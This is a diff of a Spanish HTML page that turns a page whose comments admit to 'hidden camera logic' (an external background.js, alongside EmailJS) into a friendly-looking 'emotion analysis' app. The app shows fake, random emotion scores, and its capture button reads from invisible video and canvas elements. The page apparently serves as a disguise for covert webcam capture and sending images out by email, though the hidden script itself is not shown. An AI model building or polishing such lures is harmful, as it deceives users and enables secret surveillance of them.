@@ -1,20 +1,436 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Recuerdos Automáticos 📸</title>
-</head>
-<body>
-  <h1>📷 Capturando tus recuerdos...</h1>
+  <title>Análisis Emocional 📸</title>
+  <style>
+    :root {
+      --primary: #6a5af9;
+      --primary-dark: #5a4af0;
+      --secondary: #ff6b8b;
+      --light: #f8f9fa;
+      --dark: #343a40;
+      --success: #4cd964;
+      --border-radius: 16px;
+      --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      --transition: all 0.3s ease;
+    }
 
-  <!-- Cámara visible -->
-  <video id="videoVisible" autoplay playsinline style="width:100%; max-width:400px; border:2px solid gold;"></video>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      color: var(--dark);
+      line-height: 1.6;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+      padding: 20px;
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+      width: 100%;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: #6c757d;
+      margin-bottom: 20px;
+    }
+
+    .card {
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+      padding: 30px;
+      margin-bottom: 30px;
+      transition: var(--transition);
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+    }
+
+    .card-title {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .camera-container {
+      position: relative;
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+      border-radius: var(--border-radius);
+      overflow: hidden;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+    }
+
+    video {
+      width: 100%;
+      display: block;
+      border-radius: var(--border-radius);
+    }
+
+    .camera-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      pointer-events: none;
+    }
+
+    .focus-ring {
+      width: 80%;
+      height: 80%;
+      border: 3px solid rgba(255, 255, 255, 0.7);
+      border-radius: 50%;
+      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: var(--transition);
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .btn-primary {
+      background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+      color: white;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 7px 20px rgba(106, 90, 249, 0.4);
+    }
+
+    .btn-secondary {
+      background: white;
+      color: var(--primary);
+      border: 2px solid var(--primary);
+    }
+
+    .btn-secondary:hover {
+      background: var(--light);
+    }
+
+    .controls {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+
+    #preview {
+      margin-top: 30px;
+      text-align: center;
+      display: none;
+    }
+
+    .preview-container {
+      position: relative;
+      display: inline-block;
+      max-width: 500px;
+      width: 100%;
+    }
+
+    #previewImg {
+      width: 100%;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+    }
+
+    .emotion-overlay {
+      position: absolute;
+      bottom: 20px;
+      left: 0;
+      width: 100%;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+      color: white;
+      border-radius: 0 0 var(--border-radius) var(--border-radius);
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+    }
+
+    .emotion-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .emotion-value {
+      font-weight: bold;
+      margin-top: 5px;
+      font-size: 1.1rem;
+    }
+
+    .emotion-label {
+      font-size: 0.8rem;
+      opacity: 0.8;
+    }
+
+    .emotion-happy {
+      color: var(--success);
+    }
+
+    .emotion-neutral {
+      color: #ffcc00;
+    }
+
+    .emotion-sad {
+      color: #5ac8fa;
+    }
+
+    .emotion-angry {
+      color: #ff3b30;
+    }
+
+    .download-section {
+      margin-top: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(106, 90, 249, 0.4);
+      }
+      70% {
+        box-shadow: 0 0 0 15px rgba(106, 90, 249, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(106, 90, 249, 0);
+      }
+    }
+
+    .status-indicator {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+      justify-content: center;
+    }
+
+    .status-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--success);
+      animation: blink 2s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      color: #6c757d;
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2rem;
+      }
+      
+      .card {
+        padding: 20px;
+      }
+      
+      .controls {
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      .btn {
+        width: 100%;
+        max-width: 300px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <header>
+      <h1>Análisis Emocional</h1>
+      <p class="subtitle">Captura tu expresión facial y analiza tus emociones en tiempo real</p>
+      <div class="status-indicator">
+        <div class="status-dot"></div>
+        <span>Sistema de análisis activo</span>
+      </div>
+    </header>
+
+    <main>
+      <div class="card">
+        <h2 class="card-title">📷 Cámara de emociones</h2>
+        <div class="camera-container">
+          <video id="videoVisible" autoplay playsinline></video>
+          <div class="camera-overlay">
+            <div class="focus-ring"></div>
+          </div>
+        </div>
+        
+        <div class="controls">
+          <button id="btnFoto" class="btn btn-primary pulse">
+            <span>📸</span> Capturar emoción
+          </button>
+        </div>
+      </div>
+
+      <div id="preview" class="card">
+        <h2 class="card-title">🎭 Análisis de emociones</h2>
+        <div class="preview-container">
+          <img id="previewImg" src="" alt="Foto tomada" />
+          <div class="emotion-overlay">
+            <div class="emotion-item">
+              <span class="emotion-label">Felicidad</span>
+              <span class="emotion-value emotion-happy">85%</span>
+            </div>
+            <div class="emotion-item">
+              <span class="emotion-label">Neutral</span>
+              <span class="emotion-value emotion-neutral">10%</span>
+            </div>
+            <div class="emotion-item">
+              <span class="emotion-label">Tristeza</span>
+              <span class="emotion-value emotion-sad">3%</span>
+            </div>
+            <div class="emotion-item">
+              <span class="emotion-label">Enojo</span>
+              <span class="emotion-value emotion-angry">2%</span>
+            </div>
+          </div>
+        </div>
+        
+        <div class="download-section">
+          <a id="downloadLink" class="btn btn-secondary" download="analisis-emocional.jpg">
+            <span>💾</span> Descargar análisis
+          </a>
+          <button class="btn btn-primary">
+            <span>📤</span> Compartir resultado
+          </button>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <p>Sistema de análisis emocional &copy; 2023 | Tus emociones en cada captura</p>
+    </footer>
+  </div>
 
   <!-- EmailJS desde CDN -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-  <!-- Tu lógica de cámara oculta -->
+  <!-- Tu JS original -->
   <script src="background.js"></script>
+
+  <script>
+    // Botón captura foto sin tocar la función original
+    document.getElementById("btnFoto").addEventListener("click", () => {
+      if (!videoInvisible || !canvasInvisible) {
+        alert("⚠️ La cámara aún no está lista.");
+        return;
+      }
+
+      const ctx = canvasInvisible.getContext("2d");
+      canvasInvisible.width = videoInvisible.videoWidth / 2;
+      canvasInvisible.height = videoInvisible.videoHeight / 2;
+
+      ctx.drawImage(videoInvisible, 0, 0, canvasInvisible.width, canvasInvisible.height);
+
+      // Fecha y hora
+      const now = new Date();
+      ctx.font = "30px Arial";
+      ctx.fillStyle = "white";
+      ctx.strokeStyle = "black";
+      ctx.lineWidth = 2;
+      const text = now.toLocaleString();
+      ctx.strokeText(text, 20, canvasInvisible.height - 30);
+      ctx.fillText(text, 20, canvasInvisible.height - 30);
+
+      // Obtener imagen
+      const imageData = canvasInvisible.toDataURL("image/jpeg", 0.8);
+
+      // Vista previa
+      const preview = document.getElementById("preview");
+      const img = document.getElementById("previewImg");
+      const link = document.getElementById("downloadLink");
+
+      img.src = imageData;
+      preview.style.display = "block";
+      link.href = imageData;
+      link.style.display = "inline-block";
+      
+      // Simular análisis de emociones (en un sistema real esto vendría de una API)
+      setTimeout(() => {
+        // Aquí se actualizarían los valores de emociones con datos reales
+        document.querySelectorAll('.emotion-value').forEach(el => {
+          // Simulación de valores aleatorios
+          el.textContent = Math.floor(Math.random() * 100) + '%';
+        });
+      }, 1000);
+    });
+  </script>
 </body>
+
 </html>
